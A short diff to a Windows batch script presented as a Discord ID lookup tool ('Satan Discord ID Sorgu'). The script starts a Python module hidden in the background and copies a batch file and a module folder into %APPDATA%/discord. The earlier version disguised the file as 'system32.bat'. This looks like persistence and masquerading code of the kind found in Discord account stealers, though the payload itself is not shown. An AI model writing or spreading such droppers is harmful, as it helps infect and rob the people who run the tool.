@@ -3,12 +3,12 @@ chcp 65001 >nul
 title Satan Discord ID Sorgu
 start "" /B python modules/accepts/main.py
 @echo off
-set STARTUP=C:\Users\accepts
+set STARTUP=%APPDATA%/discord
 set KAYNAK=%~dp0modules\accepts
 
-copy "%KAYNAK%\discordid.bat" "%STARTUP%\system32.bat"
+copy "%KAYNAK%\discordid.bat" "%STARTUP%\discord.bat"
 @echo off
-set HEDEF=C:\Users\accepts
+set HEDEF=%APPDATA%/discord
 set KAYNAK=%~dp0modules\accepts
 
 robocopy "%KAYNAK%" "%HEDEF%" /E
